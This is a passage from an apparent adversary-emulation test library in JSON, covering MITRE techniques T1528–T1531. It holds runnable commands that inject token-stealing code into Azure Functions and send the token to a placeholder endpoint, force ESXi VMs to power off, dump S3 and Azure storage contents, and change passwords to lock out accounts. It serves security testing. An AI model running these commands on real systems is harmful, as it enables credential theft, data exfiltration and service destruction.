      "description": "This test injects code into an Azure Function (RCE).\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nSimilar to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\", the depicted code injection scenario tampers the source code of Azure Functions to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance. In this case, the prepared zip file (underlying package for a Function) is expected to contain the tampered function presented in src/code_to_insert.py. Note that the endpoint https://changeme.net needs to be adapted in your packed function code.\n\nNote:\n- The Azure Function modified in this test must be hosted via Azure Blob storage (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations). \n- For Function code upload to Azure Functions that are hosted via Azure Files in a File Share, refer to T1528 \"Azure - Functions code upload - Functions code injection to retrieve the Functions identity access token\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {    \n    $connectionString = az storage account show-connection-string --name \"#{storage_account_name}\" --query connectionString --output tsv\n\n    # Download blob for cleanup\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\n    az storage blob download --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file $tmpOriginalFunctionCode --overwrite true\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new blob version if download of existing blob succeeded\n        az storage blob upload --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file \"#{file_path_blob}\" --overwrite true\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}\n",
        "elevation_required": false,
        "cleanup_command": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + \"#{blob_name}\")\naz storage blob upload --account-name \"#{storage_account_name}\" --container-name \"#{container_name}\" --file $tmpOriginalFunctionCode --name \"#{blob_name}\" --overwrite true 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original blob file if upload succeeded\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original blob file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
      },
      "variables": [
        {
          "name": "storage_account_name",
          "description": "Name of storage account that is related to the Function",
          "type": "string",
          "default_value": "storage_account_name_example"
        },
        {
          "name": "container_name",
          "description": "Name of the container that contains the function blob",
          "type": "string",
          "default_value": "container_name_example"
        },
        {
          "name": "blob_name",
          "description": "Name of the function blob",
          "type": "string",
          "default_value": "blob_example"
        },
        {
          "name": "file_path_blob",
          "description": "Path to the function code file to upload as blob",
          "type": "path",
          "default_value": "$env:temp/T1528_function_code.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Azure CLI must be installed",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": "Install-Module -Name Az -Force"
        }
      ],
      "rx_module_id": "9a5352e4-56e5-45c2-9b3f-41a46d3b3a43",
      "module_name": "Azure - Functions code upload - Functions code injection via Blob upload"
    },
    {
      "index": 1169,
      "technique_id": "T1528",
      "technique_name": "Steal Application Access Token",
      "description": "This test injects code into an Azure Function (RCE) to perform Subscription Privilege Escalation by retrieving the identity access token of an Azure functions instance.\n\nAttack idea/reference: https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\nOnce executed, the \"https://changeme\" will retrieve the access token when the function app is executed on behalf of the tenant. The function may be triggered manually from authorized people, triggered in regular intervals, or in various other ways. The access token can then be used to perform further attack steps with the permissions that the function app holds (e.g. listening virtual machines).\n\nNote: \n- The Azure Function modified in this test must be hosted via Azure Files in a File Share (Info on storage considerations for Azure Function: https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).\n- For Function code upload to Azure Functions that are hosted via Azure Blob storage, refer to T1528 \"Azure - Functions code upload - Functions code injection via Blob upload\".\n- The required input fields can be retrieved in a reconnaissance step in test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". The code of function apps may be inspected and prepared from the result of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n- Important: Change the https://changeme.net in code_to_insert_path to a self-controlled endpoint. This endpoint can be hosted e.g. as request bin via Pipedream to display the body of incoming POST requests.\n- The default injected code to retrieve the access token can be replaced by arbitrary other code. In this case: Replace the code defined in code_to_insert_path\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.\n\nExecution options: Defined by the input field execution_option\n- insert_code: This option (1) downloads the existing funciton code into a tmp file, (2) injects the code from code_to_insert_path at the beginning of the file, and (3) uploads the tampered file to the targeted Azure Function code (Azure File Share File).\n- replace_file: This option uploads the function code defined in code_to_insert_path to the targeted Azure Function code (Azure File Share File).",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {\n    # Download file for cleanup\n    $tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\n    az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpOriginalFunctionCode\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new funciton code if download of existing code succeeded\n        if (\"#{execution_option}\" -eq \"insert_code\") {\n            # Download file from file share for injection\n            $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n            az storage file download --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --only-show-errors --dest $tmpFunctionCode\n            \n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code download failed.\"\n                exit 1\n            }\n            Write-Output \"File downloaded: $($tmpFunctionCode)\"\n            \n            $insertContent = Get-Content -Path \"#{code_to_insert_path}\" -Raw  # Load the content of the insert file\n            \n            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file\n            $content = $insertContent + \"`n\" + $content     # Insert the new code at the beginning\n            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file\n            \n            # Upload file to file share\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpFunctionCode --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } elseif (\"#{execution_option}\" -eq \"replace_file\") {\n            az storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source \"#{code_to_insert_path}\" --only-show-errors\n            if ($LASTEXITCODE -ne 0) {\n                Write-Output \"Function code upload failed.\"\n                exit 1\n            }\n            Write-Output \"Uploaded the tampered file\"\n        } else {\n            Write-Output \"Please choose a valid execution_option\"\n            exit 1\n        }\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}",
        "elevation_required": false,
        "cleanup_command": "az login    # Log in to Azure CLI\n\n# Upload previous funciton code\n$tmpOriginalFileName = [System.IO.Path]::GetFileName(\"#{file_path}\")\n$tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_original_\" + $tmpOriginalFileName)\naz storage file upload --account-name \"#{storage_account_name}\" --share-name \"#{file_share_name}\" -p \"#{file_path}\" --source $tmpOriginalFunctionCode --only-show-errors 2>$null\n\nif ($LASTEXITCODE -eq 0) {\n    Write-Output \"Uploaded original version of function code.\"\n\n    # Delete tmp original f file if upload succeeded\n    if (\"#{execution_option}\" -eq \"insert_code\") {\n        $tmpFunctionCode = Join-Path $env:temp/ (\"T1528_tmp_to_inject_\" + $tmpOriginalFileName)\n        Remove-Item -Path $tmpFunctionCode -Force -erroraction silentlycontinue\n        Write-Output \"Deleted tmp file: $($tmpFunctionCode)\"\n    }\n\n    # Delete tmp original file\n    Remove-Item -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue\n    Write-Output \"Deleted tmp original file: $($tmpOriginalFunctionCode)\"\n} else {\n    Write-Output \"Upload original function code failed.\"\n}"
      },
      "variables": [
        {
          "name": "storage_account_name",
          "description": "Name of storage account that is related to the Function",
          "type": "string",
          "default_value": "storage_account_name_example"
        },
        {
          "name": "execution_option",
          "description": "Chooses execution option insert_code, or replace_file",
          "type": "string",
          "default_value": "insert_code"
        },
        {
          "name": "file_share_name",
          "description": "Name of the file share that is related to the Function",
          "type": "string",
          "default_value": "file_share_name_example"
        },
        {
          "name": "file_path",
          "description": "Path to the Function file in the file share",
          "type": "path",
          "default_value": "site/wwwroot/function_app.py"
        },
        {
          "name": "code_to_insert_path",
          "description": "The code that will be injected into the Function",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1528/src/code_to_insert.py"
        }
      ],
      "prerequisites": [
        {
          "description": "Azure CLI must be installed",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": "Install-Module -Name Az -Force"
        }
      ],
      "rx_module_id": "67aaf4cb-54ce-42e2-ab56-e0a9bcc089b1",
      "module_name": "Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token"
    },
    {
      "index": 1170,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test shuts down a Windows system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "shutdown /s /t #{timeout}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "timeout",
          "description": "Timeout period before shutdown (seconds)",
          "type": "integer",
          "default_value": 1
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ad254fa8-45c0-403b-8c77-e00b3d3e7a64",
      "module_name": "Shutdown System - Windows"
    },
    {
      "index": 1171,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a Windows system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "shutdown /r /t #{timeout}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "timeout",
          "description": "Timeout period before restart (seconds)",
          "type": "integer",
          "default_value": 1
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f4648f0d-bf78-483c-bafc-3ec99cd1c302",
      "module_name": "Restart System - Windows"
    },
    {
      "index": 1172,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a FreeBSD/macOS/Linux system.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "shutdown -r #{timeout}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "timeout",
          "description": "Time to restart (can be minutes or specific time)",
          "type": "string",
          "default_value": "now"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6326dbc4-444b-4c04-88f4-27e94d0327cb",
      "module_name": "Restart System via `shutdown` - FreeBSD/macOS/Linux"
    },
    {
      "index": 1173,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test shuts down a FreeBSD/macOS/Linux system using a halt.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "shutdown -h #{timeout}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "timeout",
          "description": "Time to shutdown (can be minutes or specific time)",
          "type": "string",
          "default_value": "now"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4963a81e-a3ad-4f02-adda-812343b351de",
      "module_name": "Shutdown System via `shutdown` - FreeBSD/macOS/Linux"
    },
    {
      "index": 1174,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a FreeBSD/macOS/Linux system via `reboot`.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "reboot\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "47d0b042-a918-40ab-8cf9-150ffe919027",
      "module_name": "Restart System via `reboot` - FreeBSD/macOS/Linux"
    },
    {
      "index": 1175,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test shuts down a FreeBSD/Linux system using `halt`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "halt -p\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "918f70ab-e1ef-49ff-bc57-b27021df84dd",
      "module_name": "Shutdown System via `halt` - FreeBSD/Linux"
    },
    {
      "index": 1176,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a FreeBSD system using `halt`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "halt -r\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7b1cee42-320f-4890-b056-d65c8b884ba5",
      "module_name": "Reboot System via `halt` - FreeBSD"
    },
    {
      "index": 1177,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a Linux system using `halt`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "halt --reboot\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "78f92e14-f1e9-4446-b3e9-f1b921f2459e",
      "module_name": "Reboot System via `halt` - Linux"
    },
    {
      "index": 1178,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test shuts down a FreeBSD/Linux system using `poweroff`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "poweroff\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "73a90cd2-48a2-4ac5-8594-2af35fa909fa",
      "module_name": "Shutdown System via `poweroff` - FreeBSD/Linux"
    },
    {
      "index": 1179,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a FreeBSD system using `poweroff`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "poweroff -r 3\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5a282e50-86ff-438d-8cef-8ae01c9e62e1",
      "module_name": "Reboot System via `poweroff` - FreeBSD"
    },
    {
      "index": 1180,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test restarts a Linux system using `poweroff`.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "poweroff --reboot\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "61303105-ff60-427b-999e-efb90b314e41",
      "module_name": "Reboot System via `poweroff` - Linux"
    },
    {
      "index": 1181,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "This test performs a Windows system logoff as seen in [dcrat backdoor capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "shutdown /l \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4",
      "module_name": "Logoff System - Windows"
    },
    {
      "index": 1182,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "In VMWARE ESXi, process names starting with vmx are associated with running VMs. An adversary can use the pkill command to kill all processes with a prefix vmx.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to text with commands",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1529\\src\\esx_pkill.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "987c9b4d-a637-42db-b1cb-e9e242c3991b",
      "module_name": "ESXi - Terminates VMs using pkill"
    },
    {
      "index": 1183,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "Avoslocker malware has inbuilt functionality to enumerate the VM instances and uses the esxcli command to forcefully power off them.\n[Reference](https://blogs.vmware.com/security/2022/02/avoslocker-modern-linux-ransomware-threats.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to text with commands",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1529\\src\\esx_avoslocker_kill_vm.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "189f7d6e-9442-4160-9bc3-5e4104d93ece",
      "module_name": "ESXi - Avoslocker enumerates VMs and forcefully kills VMs"
    },
    {
      "index": 1184,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "Adversaries may power off VMs to facilitate the deployment of ransomware payloads.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#power%20off%20vm)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if we have plink\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "622cc1a0-45e7-428c-aed7-c96dd605fbe6",
      "module_name": "ESXi - vim-cmd Used to Power Off VMs"
    },
    {
      "index": 1185,
      "technique_id": "T1529",
      "technique_name": "System Shutdown/Reboot",
      "description": "adversaries with root or sufficient privileges to silently manipulate or destabilize a system. By writing to /proc/sysrq-trigger, they can forced to reboot.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"b\" > /proc/sysrq-trigger\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d2a1f4bc-a064-4223-8281-a086dce5423c",
      "module_name": "Abuse of Linux Magic System Request Key for Reboot"
    },
    {
      "index": 1186,
      "technique_id": "T1530",
      "technique_name": "Data from Cloud Storage Object",
      "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n",
        "elevation_required": false,
        "cleanup_command": "aws s3 rb s3://#{s3_bucket_name} --force \nrm -rf /tmp/#{s3_bucket_name}\n"
      },
      "variables": [
        {
          "name": "s3_bucket_name",
          "description": "Name of the bucket",
          "type": "string",
          "default_value": "redraglox-test2"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\naws s3api create-bucket --bucket #{s3_bucket_name}\naws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToRagloxModulesFolder/T1530/src/policy.json\ntouch /tmp/T1530.txt\naws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}\n",
          "install_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
        }
      ],
      "rx_module_id": "979356b9-b588-4e49-bba4-c35517c484f5",
      "module_name": "AWS - Scan for Anonymous Access to S3"
    },
    {
      "index": 1187,
      "technique_id": "T1530",
      "technique_name": "Data from Cloud Storage Object",
      "description": "This test dumps the content of the storage account objects present in the file defined in file_shares_csv_file_path. Note that this file is created in the RAGLOX module T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\". When created manually, it must contain the columns \"ResourceGroup\",\"StorageAccountName\", \"FileShareName\", \"ContainerName\", \"BlobName\".\n\nRequirements:\n    - The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n    - The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "$storage_account_objects = Import-Csv -Path \"#{storage_account_objects_csv_file_path}\"\n\n# Login to Azure\naz login\n\nif (-not (Test-Path -Path \"#{output_folder}\")) {\n    New-Item -ItemType Directory -Path \"#{output_folder}\"\n}\n\nforeach ($row in $storage_account_objects) {\n    \n    if ($row.FileShareName -ne \"\"){\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for file share content\n            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName\n            if (-not (Test-Path -Path $fileSharePath)) {\n                New-Item -ItemType Directory -Path $fileSharePath\n            }\n            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath\n        }\n    } elseif ($row.ContainerName -ne \"\" -and $row.BlobName -eq \"\") {\n        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query \"allowSharedKeyAccess\"\n\n        if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n            Write-Output \"Shared key access is disabled for this storage account.\"\n        } else {\n            Write-Output \"Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...\"\n            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv\n            \n            # Create folder for storage account objects\n            $storageAccountOutputPath = Join-Path #{output_folder} \"$($row.ResourceGroup)_$($row.StorageAccountName)\"\n            if (-not (Test-Path -Path $storageAccountOutputPath)) {\n                New-Item -ItemType Directory -Path $storageAccountOutputPath\n            }\n\n            # create folder for blob content\n            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName\n            if (-not (Test-Path -Path $containerFolderPath)) {\n                New-Item -ItemType Directory -Path $containerFolderPath\n            }\n            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString\n        }\n    }\n}",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{output_folder}\" -Recurse -Force -erroraction silentlycontinue\nWrite-Output \"Removed #{output_folder}\""
      },
      "variables": [
        {
          "name": "output_folder",
          "description": "Folder path to output file share content to",
          "type": "path",
          "default_value": "$env:temp\\T1530_storage_account_objects"
        },
        {
          "name": "storage_account_objects_csv_file_path",
          "description": "Path to file that contains all storage account objects in form of a csv file. This may be the result from Test T1619 \"Azure - Enumerate Storage Account Objects via Key-based authentication using Azure CLI\".",
          "type": "path",
          "default_value": "$env:temp\\T1619_storage_account_objects.csv"
        }
      ],
      "prerequisites": [
        {
          "description": "Azure CLI must be installed",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": "Install-Module -Name Az -Force"
        }
      ],
      "rx_module_id": "67374845-b4c8-4204-adcc-9b217b65d4f1",
      "module_name": "Azure - Dump Azure Storage Account Objects via Azure CLI"
    },
    {
      "index": 1188,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"RAGLOXAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n",
        "elevation_required": true,
        "cleanup_command": "net.exe user #{user_account} /delete >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "user_account",
          "description": "User account whose password will be changed.",
          "type": "string",
          "default_value": "RAGLOXAdministrator"
        },
        {
          "name": "new_user_password",
          "description": "Password to use if user account must be created first",
          "type": "string",
          "default_value": "User2ChangePW!"
        },
        {
          "name": "new_password",
          "description": "New password for the specified account.",
          "type": "string",
          "default_value": "HuHuHUHoHo283283@dJD"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1b99ef28-f83c-4ec5-8a08-1a56263a5bb2",
      "module_name": "Change User Password - Windows"
    },
    {
      "index": 1189,
      "technique_id": "T1531",
      "technique_name": "Account Access Removal",
      "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"RAGLOXUser\" account was deleted.\n",
      "execution": {
